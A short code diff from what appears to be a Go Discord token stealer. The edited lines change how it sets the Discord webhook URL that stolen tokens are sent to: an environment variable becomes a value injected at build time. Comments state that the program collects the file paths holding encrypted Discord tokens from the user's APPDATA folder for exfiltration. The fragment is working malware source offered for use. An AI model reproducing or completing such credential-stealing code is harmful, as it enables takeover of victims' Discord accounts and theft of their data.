@@ -24,9 +24,9 @@ const (
 var (
 	// Get the folder path to where Discord stores its data
 	appdataDir = filepath.ToSlash(os.Getenv("APPDATA"))
-	// Define Discord webhook URL to send tokens to. I have it set to an environment variable
-	// for testing, but you could always make this a const with an actual webhook URL
-	webhookUrl = os.Getenv("webhookUrl")
+	// Initialize empty string for Discord webhook URL to send tokens to. Value
+	// of this variable is injected at build time with a simple script
+	webhookUrl string
 )
 
 // This function gets all possible file paths that may contain encrypted Discord tokens.
